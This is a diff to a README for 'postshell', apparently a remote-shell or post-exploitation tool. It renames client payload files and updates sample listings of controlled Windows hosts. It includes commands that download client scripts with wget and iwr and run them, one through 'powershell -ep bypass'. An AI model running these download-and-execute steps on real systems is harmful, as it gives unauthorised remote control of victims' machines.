@@ -117,18 +117,18 @@ payload> generate
 
 Transfer the client script
 ```
-wget http://127.0.0.1/tools/127_0_0_1_80.sh
+wget http://127.0.0.1/tools/client.sh
 
-iwr http://127.0.0.1/tools/127_0_0_1_80.ps1 -outfile 127_0_0_1_80.ps1
+iwr http://127.0.0.1/tools/client.ps1 -outfile client.ps1
 ```
 
 Execute the script on the client
 ```
-bash 127_0_0_1_80.sh
+bash client.sh
 
-python3 127_0_0_1_80.py
+python3 client.py
 
-powershell -ep bypass 127_0_0_1_80.ps1
+powershell -ep bypass client.ps1
 ```
 
 To see active clients
@@ -143,14 +143,15 @@ postshell> list
 ║ 4  ║ 192.168.193.129 ║ DESKTOP-P5KACDB ║ system  ║ Windows 10 Pro ║ 10.0.19045       ║ 64-bit ║
 ╚════╩═════════════════╩═════════════════╩═════════╩════════════════╩══════════════════╩════════╝
 
-postshell> list 
-╔════╦═════════════╦═══════════╦════════╦══════════════════════════════╦════════════╦════════╗
-║ ID ║ IP          ║ HOSTNAME  ║ USER   ║ OS                           ║ VERSION    ║ ARCH   ║
-╠════╬═════════════╬═══════════╬════════╬══════════════════════════════╬════════════╬════════╣
-║ 1  ║ 172.16.12.5 ║ SKYWALKER ║ luke   ║ Windows 11 Pro               ║ 10.0.26100 ║ 64-bit ║
-║ 2  ║ 172.16.12.2 ║ WOOKIE    ║ chewie ║ Windows 11 Pro               ║ 10.0.26100 ║ 64-bit ║
-║ 3  ║ 172.16.12.4 ║ SOLO      ║ han    ║ Windows Server 2025 Standard ║ 10.0.26100 ║ 64-bit ║
-╚════╩═════════════╩═══════════╩════════╩══════════════════════════════╩════════════╩════════╝
+postshell> list
+╔════╦═════════════╦══════════╦═══════════╦══════════════════════════════╦════════════╦════════╗
+║ ID ║ IP          ║ USER     ║ HOSTNAME  ║ OS                           ║ VERSION    ║ ARCH   ║
+╠════╬═════════════╬══════════╬═══════════╬══════════════════════════════╬════════════╬════════╣
+║ 1  ║ 172.16.12.3 ║ luke     ║ SKYWALKER ║ Windows 11 Pro               ║ 10.0.26100 ║ 64-bit ║
+║ 2  ║ 172.16.12.2 ║ chewie   ║ WOOKIE    ║ Windows 11 Pro               ║ 10.0.26100 ║ 64-bit ║
+║ 3  ║ 172.16.12.1 ║ han      ║ SOLO      ║ Windows Server 2025 Standard ║ 10.0.26100 ║ 64-bit ║
+╚════╩═════════════╩══════════╩═══════════╩══════════════════════════════╩════════════╩════════╝
+
 ```
 
 To connect to an active session
